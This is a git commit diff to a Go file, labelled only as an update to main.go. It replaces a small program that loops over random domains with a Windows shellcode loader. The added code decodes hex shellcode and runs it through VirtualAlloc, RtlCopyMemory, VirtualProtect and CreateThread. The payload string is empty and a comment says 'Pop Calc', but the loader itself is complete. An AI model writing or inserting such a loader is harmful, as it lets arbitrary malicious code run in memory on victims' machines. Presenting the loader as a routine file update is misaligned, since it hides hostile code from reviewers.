a290352e9308ea7d4eeb5dd946f60e069741b68c
hututu4841 <w02588520@qq.com>
2025-04-01 15:36:32 +0800

    更新 main.go 文件

--- main.go
+++ main.go
@@ -1,84 +1,113 @@
 package main
 
 import (
-	"crypto/rand"
 	"encoding/hex"
+	"flag"
 	"fmt"
-	"io/ioutil"
-	"net/http"
-	"strconv"
-	"sync"
-	"time"
+	"log"
+	"unsafe"
+
+	// Sub Repositories
+	"golang.org/x/sys/windows"
 )
 
-// 生成随机字符串
-func randString(length int) string {
-	s := make([]byte, length)
-	_, err := rand.Read(s)
-	if err != nil {
-		panic(err)
-	}
-	return hex.EncodeToString(s)
-}
+const (
+	// MEM_COMMIT is a Windows constant used with Windows API calls
+	MEM_COMMIT = 0x1000
+	// MEM_RESERVE is a Windows constant used with Windows API calls
+	MEM_RESERVE = 0x2000
+	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
+	PAGE_EXECUTE_READ = 0x20
+	// PAGE_READWRITE is a Windows constant used with Windows API calls
+	PAGE_READWRITE = 0x04
+)
 
-// 发送网络请求
-func fetchData(url string) (string, error) {
-	resp, err := http.Get(url)
-	if err != nil {
-		return "", err
-	}
-	defer resp.Body.Close()
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return "", err
-	}
-	return string(body), nil
-}
-
-// 生成随机域名
-func randDomain() string {
-	return randString(30) + ".com"
-}
-
-// 主函数
 func main() {
-	urls := make([]string, 0, 3)
+	verbose := flag.Bool("verbose", false, "Enable verbose output")
+	debug := flag.Bool("debug", false, "Enable debug output")
+	flag.Parse()
 
-	for i := 0; i < 3; i++ {
-		urls = append(urls, randDomain())
+	// Pop Calc Shellcode
+	shellcode, errShellcode := hex.DecodeString("")
+	if errShellcode != nil {
+		log.Fatal(fmt.Sprintf("[!] There was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
 	}
 
-	for {
-		select {
-		case <-time.After(3 * time.Minute):
-			fmt.Println("你好,世界24!")
-			break
-		default:
-			for j := 0; j < 5; j++ {
-				for k := 0; k < 5; k++ {
-					for l := 0; l < 5; l++ {
-						// 插入无害空循环
-						for {
-							time.Sleep(100 * time.Millisecond)
-							if rand.Intn(10) == 1 {
-								break
-							}
-						}
-					}
-				}
-			}
-			fmt.Println(fetchData(urls[0]))
-		}
+	if *debug {
+		fmt.Println("[DEBUG] Loading kernel32.dll and ntdll.dll")
 	}
-}
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
-// 生成随机整数
-func randInt(max int) int {
-	num := randString(32)
-	numInt, err := strconv.Atoi(num)
-	if err != nil {
-		panic(err)
+	if *debug {
+		fmt.Println("[DEBUG] Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
 	}
-	numInt = numInt % max + 1
-	return numInt
+	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	VirtualProtect := kernel32.NewProc("VirtualProtect")
+	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+	CreateThread := kernel32.NewProc("CreateThread")
+	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
+
+	if *debug {
+		fmt.Println("[DEBUG] Calling VirtualAlloc for shellcode")
+	}
+	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!] Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
+	}
+
+	if addr == 0 {
+		log.Fatal("[!] VirtualAlloc failed and returned 0")
+	}
+
+	if *verbose {
+		fmt.Println(fmt.Sprintf("[-] Allocated %d bytes", len(shellcode)))
+	}
+
+	if *debug {
+		fmt.Println("[DEBUG] Copying shellcode to memory with RtlCopyMemory")
+	}
+	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!] Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
+	}
+	if *verbose {
+		fmt.Println("[-] Shellcode copied to memory")
+	}
+
+	if *debug {
+		fmt.Println("[DEBUG] Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
+	}
+
+	oldProtect := PAGE_READWRITE
+	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
+	}
+	if *verbose {
+		fmt.Println("[-] Shellcode memory region changed to PAGE_EXECUTE_READ")
+	}
+
+	if *debug {
+		fmt.Println("[DEBUG] Calling CreateThread...")
+	}
+	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
+
+	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!] Error calling CreateThread:\r\n%s", errCreateThread.Error()))
+	}
+	if *verbose {
+		fmt.Println("[+] Shellcode Executed")
+	}
+
+	if *debug {
+		fmt.Println("[DEBUG] Calling WaitForSingleObject...")
+	}
+
+	_, _, errWaitForSingleObject := WaitForSingleObject.Call(thread, 0xFFFFFFFF)
+	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!] Error calling WaitForSingleObject:\r\n%s", errWaitForSingleObject.Error()))
+	}
 }
